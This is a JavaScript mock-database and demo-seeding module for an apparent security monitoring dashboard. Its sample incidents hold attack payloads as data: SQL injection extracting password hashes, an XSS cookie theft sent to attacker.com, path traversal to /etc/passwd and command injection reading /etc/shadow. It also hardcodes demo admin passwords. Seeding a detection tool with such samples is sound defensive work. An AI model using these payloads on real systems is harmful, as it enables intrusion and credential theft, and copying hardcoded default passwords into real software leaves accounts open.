const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

let inMemoryUsers = [];
let inMemoryEvents = [];
let inMemoryBehaviours = [];
let isInitialized = false;

function createUserDoc(data) {
  const doc = {
    _id: data._id ? data._id.toString() : new mongoose.Types.ObjectId().toString(),
    name: data.name,
    email: data.email ? data.email.toLowerCase().trim() : '',
    passwordHash: data.passwordHash,
    role: data.role || 'USER',
    status: data.status || 'active',
    failedLoginAttempts: data.failedLoginAttempts || 0,
    lockedUntil: data.lockedUntil || null,
    createdAt: data.createdAt ? new Date(data.createdAt) : new Date(),
    updatedAt: data.updatedAt ? new Date(data.updatedAt) : new Date(),
  };

  doc.comparePassword = async function (candidatePassword) {
    if (!this.passwordHash) {
      throw new Error('Password hash not loaded for comparison');
    }
    return bcrypt.compare(candidatePassword, this.passwordHash);
  };

  doc.isLocked = function () {
    return Boolean(this.lockedUntil && new Date(this.lockedUntil).getTime() > Date.now());
  };

  doc.incrementFailedAttempts = async function () {
    if (this.lockedUntil && new Date(this.lockedUntil).getTime() <= Date.now()) {
      this.failedLoginAttempts = 1;
      this.lockedUntil = null;
      this.status = 'active';
    } else {
      this.failedLoginAttempts = (this.failedLoginAttempts || 0) + 1;
    }

    if (this.failedLoginAttempts >= 5) {
      this.lockedUntil = new Date(Date.now() + 15 * 60 * 1000);
      this.status = 'locked';
    }
    return this.save();
  };

  doc.resetLoginAttempts = async function () {
    this.failedLoginAttempts = 0;
    if (this.status === 'locked' && this.lockedUntil !== null) {
      this.status = 'active';
    }
    this.lockedUntil = null;
    return this.save();
  };

  doc.save = async function () {
    this.updatedAt = new Date();
    const idx = inMemoryUsers.findIndex((u) => u._id.toString() === this._id.toString());
    if (idx >= 0) inMemoryUsers[idx] = this;
    else inMemoryUsers.push(this);
    return this;
  };

  doc.toJSON = function () {
    const copy = { ...this };
    delete copy.passwordHash;
    delete copy.__v;
    return copy;
  };
  doc.toObject = doc.toJSON;

  return doc;
}

function createEventDoc(data) {
  const doc = {
    _id: data._id ? data._id.toString() : new mongoose.Types.ObjectId().toString(),
    timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
    ip: data.ip || '127.0.0.1',
    method: data.method || 'GET',
    path: data.path || '/',
    threatType: data.threatType || 'NORMAL',
    riskScore: typeof data.riskScore === 'number' ? data.riskScore : 0,
    severity: data.severity || 'LOW',
    action: data.action || 'ALLOW',
    ruleMatches: Array.isArray(data.ruleMatches) ? [...data.ruleMatches] : [],
    ruleSeverity: data.ruleSeverity || 'NONE',
    aiConfidence: typeof data.aiConfidence === 'number' ? data.aiConfidence : 0,
    aiModelVersion: data.aiModelVersion || 'v1.0.0',
    factors: Array.isArray(data.factors) ? [...data.factors] : [],
    breakdown: data.breakdown || {},
    telemetry: data.telemetry || {},
    userAgent: data.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    userId: data.userId || null,
    payloadSnippet: data.payloadSnippet || '',
    resolved: Boolean(data.resolved),
    notes: data.notes || '',
    createdAt: data.createdAt ? new Date(data.createdAt) : new Date(),
    updatedAt: data.updatedAt ? new Date(data.updatedAt) : new Date(),
  };

  doc.save = async function () {
    this.updatedAt = new Date();
    const idx = inMemoryEvents.findIndex((e) => e._id.toString() === this._id.toString());
    if (idx >= 0) inMemoryEvents[idx] = this;
    else inMemoryEvents.push(this);
    return this;
  };

  doc.toJSON = function () {
    return { ...this };
  };
  doc.toObject = doc.toJSON;

  return doc;
}

function createUserBehaviourDoc(data) {
  const doc = {
    _id: data._id ? data._id.toString() : new mongoose.Types.ObjectId().toString(),
    entityId: data.entityId || '127.0.0.1',
    entityType: data.entityType || 'IP',
    userId: data.userId || null,
    ip: data.ip || '',
    windowStart: data.windowStart ? new Date(data.windowStart) : new Date(),
    requestCount: typeof data.requestCount === 'number' ? data.requestCount : 0,
    burstCount: typeof data.burstCount === 'number' ? data.burstCount : 0,
    failedAuthCount: typeof data.failedAuthCount === 'number' ? data.failedAuthCount : 0,
    error4xxCount: typeof data.error4xxCount === 'number' ? data.error4xxCount : 0,
    totalRequests: typeof data.totalRequests === 'number' ? data.totalRequests : 0,
    distinctPaths: Array.isArray(data.distinctPaths) ? [...data.distinctPaths] : [],
    lastAnomalyScore: typeof data.lastAnomalyScore === 'number' ? data.lastAnomalyScore : 0.0,
    lastAnomalyLevel: data.lastAnomalyLevel || 'NORMAL',
    isAnomaly: Boolean(data.isAnomaly),
    historicalViolations: typeof data.historicalViolations === 'number' ? data.historicalViolations : 0,
    lastActive: data.lastActive ? new Date(data.lastActive) : new Date(),
    telemetryFeatures: data.telemetryFeatures || {},
    createdAt: data.createdAt ? new Date(data.createdAt) : new Date(),
    updatedAt: data.updatedAt ? new Date(data.updatedAt) : new Date(),
  };

  doc.save = async function () {
    this.updatedAt = new Date();
    const idx = inMemoryBehaviours.findIndex((b) => b._id.toString() === this._id.toString());
    if (idx >= 0) inMemoryBehaviours[idx] = this;
    else inMemoryBehaviours.push(this);
    return this;
  };

  doc.toJSON = function () {
    return { ...this };
  };
  doc.toObject = doc.toJSON;

  return doc;
}

function matchesFilter(item, filter = {}) {
  for (const [key, val] of Object.entries(filter)) {
    if (key === '$or' && Array.isArray(val)) {
      if (!val.some((subFilter) => matchesFilter(item, subFilter))) return false;
    } else if (key === 'severity' && typeof val === 'object' && val !== null && val.$in) {
      if (!val.$in.includes(item.severity)) return false;
    } else if (key === 'timestamp' && typeof val === 'object' && val !== null) {
      if (val.$gte && new Date(item.timestamp) < new Date(val.$gte)) return false;
      if (val.$lte && new Date(item.timestamp) > new Date(val.$lte)) return false;
    } else if (val instanceof RegExp) {
      if (!val.test(item[key] || '')) return false;
    } else if (item[key] !== val) {
      return false;
    }
  }
  return true;
}

function setupInMemoryDb() {
  const User = require('../models/User');
  const SecurityEvent = require('../models/SecurityEvent');
  const UserBehaviour = require('../models/UserBehaviour');

  // User methods
  User.findOne = function (query = {}) {
    let found = null;
    if (query.email) {
      const email = query.email.toLowerCase().trim();
      found = inMemoryUsers.find((u) => u.email.toLowerCase() === email);
    } else if (query._id) {
      const id = query._id.toString();
      found = inMemoryUsers.find((u) => u._id.toString() === id);
    } else {
      found = inMemoryUsers.find((u) => matchesFilter(u, query));
    }

    const chainable = {
      select: function () {
        return chainable;
      },
      then: function (resolve, reject) {
        return Promise.resolve(found ? createUserDoc(found) : null).then(resolve, reject);
      },
    };
    return chainable;
  };

  User.findById = function (id) {
    const targetId = id ? id.toString() : '';
    const found = inMemoryUsers.find((u) => u._id.toString() === targetId);
    const chainable = {
      select: function () {
        return chainable;
      },
      then: function (resolve, reject) {
        return Promise.resolve(found ? createUserDoc(found) : null).then(resolve, reject);
      },
    };
    return chainable;
  };

  User.create = async function (data) {
    const doc = createUserDoc(data);
    inMemoryUsers.push(doc);
    return doc;
  };

  User.find = function (filter = {}) {
    let skipCount = 0;
    let limitCount = Infinity;
    const chainable = {
      select: function () {
        return chainable;
      },
      sort: function () {
        return chainable;
      },
      skip: function (n) {
        skipCount = n;
        return chainable;
      },
      limit: function (n) {
        limitCount = n;
        return chainable;
      },
      then: function (resolve, reject) {
        let users = inMemoryUsers.filter((u) => matchesFilter(u, filter));
        const paginated = users.slice(skipCount, skipCount + limitCount).map(createUserDoc);
        return Promise.resolve(paginated).then(resolve, reject);
      },
    };
    return chainable;
  };

  User.countDocuments = function (filter = {}) {
    const matched = inMemoryUsers.filter((u) => matchesFilter(u, filter));
    return Promise.resolve(matched.length);
  };

  User.findByIdAndDelete = function (id) {
    const targetId = id ? id.toString() : '';
    const idx = inMemoryUsers.findIndex((u) => u._id.toString() === targetId);
    if (idx >= 0) {
      const removed = inMemoryUsers.splice(idx, 1)[0];
      return Promise.resolve(removed);
    }
    return Promise.resolve(null);
  };

  // SecurityEvent methods
  SecurityEvent.create = async function (data) {
    const doc = createEventDoc(data);
    inMemoryEvents.unshift(doc);
    return doc;
  };

  SecurityEvent.findById = function (id) {
    const targetId = id ? id.toString() : '';
    const found = inMemoryEvents.find((e) => e._id.toString() === targetId);
    return Promise.resolve(found ? createEventDoc(found) : null);
  };

  SecurityEvent.findByIdAndUpdate = function (id, update, options) {
    const targetId = id ? id.toString() : '';
    const found = inMemoryEvents.find((e) => e._id.toString() === targetId);
    if (!found) return Promise.resolve(null);
    const updates = update.$set || update;
    Object.assign(found, updates, { updatedAt: new Date() });
    return Promise.resolve(createEventDoc(found));
  };

  SecurityEvent.find = function (filter = {}) {
    let skipCount = 0;
    let limitCount = Infinity;
    let sortField = 'timestamp';
    let sortOrder = -1;

    const chainable = {
      select: function () {
        return chainable;
      },
      sort: function (sortObj = {}) {
        const [field, order] = Object.entries(sortObj)[0] || ['timestamp', -1];
        sortField = field;
        sortOrder = order === 1 || order === 'asc' ? 1 : -1;
        return chainable;
      },
      skip: function (n) {
        skipCount = n;
        return chainable;
      },
      limit: function (n) {
        limitCount = n;
        return chainable;
      },
      exec: function () {
        return chainable.then((res) => res);
      },
      then: function (resolve, reject) {
        const filtered = inMemoryEvents.filter((e) => matchesFilter(e, filter));
        const sorted = [...filtered].sort((a, b) => {
          if (a[sortField] < b[sortField]) return -1 * sortOrder;
          if (a[sortField] > b[sortField]) return 1 * sortOrder;
          return 0;
        });
        const paginated = sorted.slice(skipCount, skipCount + limitCount).map(createEventDoc);
        return Promise.resolve(paginated).then(resolve, reject);
      },
    };
    return chainable;
  };

  SecurityEvent.countDocuments = function (filter = {}) {
    const matched = inMemoryEvents.filter((e) => matchesFilter(e, filter));
    return Promise.resolve(matched.length);
  };

  // UserBehaviour methods
  UserBehaviour.findOne = function (query = {}) {
    const found = inMemoryBehaviours.find((b) => matchesFilter(b, query));
    return Promise.resolve(found ? createUserBehaviourDoc(found) : null);
  };

  UserBehaviour.create = async function (data) {
    const doc = createUserBehaviourDoc(data);
    inMemoryBehaviours.push(doc);
    return doc;
  };

  UserBehaviour.find = function (filter = {}) {
    let limitCount = Infinity;
    const chainable = {
      sort: function () {
        return chainable;
      },
      limit: function (n) {
        limitCount = n;
        return chainable;
      },
      then: function (resolve, reject) {
        const filtered = inMemoryBehaviours.filter((b) => matchesFilter(b, filter));
        return Promise.resolve(filtered.slice(0, limitCount).map(createUserBehaviourDoc)).then(resolve, reject);
      },
    };
    return chainable;
  };

  isInitialized = true;
}

async function seedDemoData() {
  const User = require('../models/User');
  const SecurityEvent = require('../models/SecurityEvent');

  // Seed Demo Accounts if not already present
  const adminEmail = 'demo.admin@sentinelai.local';
  if (!inMemoryUsers.some((u) => u.email === adminEmail)) {
    const adminHash = await bcrypt.hash('AdminPassword123!', 10);
    inMemoryUsers.push(
      createUserDoc({
        name: 'Demo Super Admin',
        email: adminEmail,
        passwordHash: adminHash,
        role: 'ADMIN',
        status: 'active',
      })
    );
  }

  const analystEmail = 'demo.analyst@sentinelai.local';
  if (!inMemoryUsers.some((u) => u.email === analystEmail)) {
    const analystHash = await bcrypt.hash('AnalystPassword123!', 10);
    inMemoryUsers.push(
      createUserDoc({
        name: 'Demo SOC Analyst',
        email: analystEmail,
        passwordHash: analystHash,
        role: 'ANALYST',
        status: 'active',
      })
    );
  }

  // Seed sample security incidents if collection is empty
  if (inMemoryEvents.length === 0) {
    const now = Date.now();
    const sampleIncidents = [
      {
        ip: '198.51.100.42',
        method: 'POST',
        path: '/api/auth/login',
        threatType: 'SQL_INJECTION',
        riskScore: 96,
        severity: 'CRITICAL',
        action: 'BLOCK',
        ruleMatches: ['SQLI_TAUTOLOGY', 'SQLI_UNION_SELECT'],
        ruleSeverity: 'CRITICAL',
        aiConfidence: 0.98,
        aiModelVersion: 'v1.2.0',
        factors: ['Deterministic SQL pattern match', 'High AI confidence score (0.98)'],
        payloadSnippet: "admin' UNION SELECT username, passwordHash FROM users--",
        resolved: false,
        timestamp: new Date(now - 3 * 60 * 1000),
      },
      {
        ip: '203.0.113.88',
        method: 'POST',
        path: '/api/feedback',
        threatType: 'XSS',
        riskScore: 88,
        severity: 'HIGH',
        action: 'BLOCK',
        ruleMatches: ['XSS_SCRIPT_TAG'],
        ruleSeverity: 'HIGH',
        aiConfidence: 0.94,
        aiModelVersion: 'v1.2.0',
        factors: ['Inline script tag injection detected'],
        payloadSnippet: '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
        resolved: false,
        timestamp: new Date(now - 12 * 60 * 1000),
      },
      {
        ip: '192.0.2.145',
        method: 'GET',
        path: '/api/files/download',
        threatType: 'PATH_TRAVERSAL',
        riskScore: 92,
        severity: 'HIGH',
        action: 'BLOCK',
        ruleMatches: ['TRAVERSAL_DOT_DOT_SLASH'],
        ruleSeverity: 'HIGH',
        aiConfidence: 0.96,
        aiModelVersion: 'v1.2.0',
        factors: ['Directory escape sequence detected'],
        payloadSnippet: '../../../../etc/passwd',
        resolved: true,
        notes: 'Penetration testing drill from authorized internal IP.',
        timestamp: new Date(now - 25 * 60 * 1000),
      },
      {
        ip: '198.51.100.104',
        method: 'POST',
        path: '/api/tools/ping',
        threatType: 'COMMAND_INJECTION',
        riskScore: 100,
        severity: 'CRITICAL',
        action: 'BLOCK',
        ruleMatches: ['CMD_PIPE_EXECUTION'],
        ruleSeverity: 'CRITICAL',
        aiConfidence: 0.99,
        aiModelVersion: 'v1.2.0',
        factors: ['Subshell pipeline execution detected'],
        payloadSnippet: '127.0.0.1 | cat /etc/shadow',
        resolved: false,
        timestamp: new Date(now - 45 * 60 * 1000),
      },
      {
        ip: '192.0.2.221',
        method: 'POST',
        path: '/api/auth/login',
        threatType: 'BEHAVIORAL_ANOMALY',
        riskScore: 78,
        severity: 'HIGH',
        action: 'BLOCK',
        ruleMatches: [],
        ruleSeverity: 'NONE',
        aiConfidence: 0.89,
        aiModelVersion: 'isolation-forest-v1',
        factors: ['High request velocity', 'Excessive failed authentication attempts'],
        payloadSnippet: 'Automated brute-force credential spray: 42 requests in 60s window',
        resolved: false,
        timestamp: new Date(now - 70 * 60 * 1000),
      },
      {
        ip: '10.0.4.15',
        method: 'GET',
        path: '/api/threats/stats',
        threatType: 'NORMAL',
        riskScore: 5,
        severity: 'LOW',
        action: 'ALLOW',
        ruleMatches: [],
        ruleSeverity: 'NONE',
        aiConfidence: 0.02,
        aiModelVersion: 'v1.2.0',
        factors: ['Baseline SOC analyst telemetry polling'],
        payloadSnippet: '',
        resolved: true,
        timestamp: new Date(now - 90 * 60 * 1000),
      },
    ];

    for (const inc of sampleIncidents) {
      inMemoryEvents.push(createEventDoc(inc));
    }
  }
}

function clearInMemoryDb() {
  inMemoryUsers = [];
  inMemoryEvents = [];
  inMemoryBehaviours = [];
}

module.exports = {
  setupInMemoryDb,
  seedDemoData,
  clearInMemoryDb,
  createUserDoc,
  createEventDoc,
  createUserBehaviourDoc,
  matchesFilter,
  getInMemoryUsers: () => inMemoryUsers,
  getInMemoryEvents: () => inMemoryEvents,
  getInMemoryBehaviours: () => inMemoryBehaviours,
};
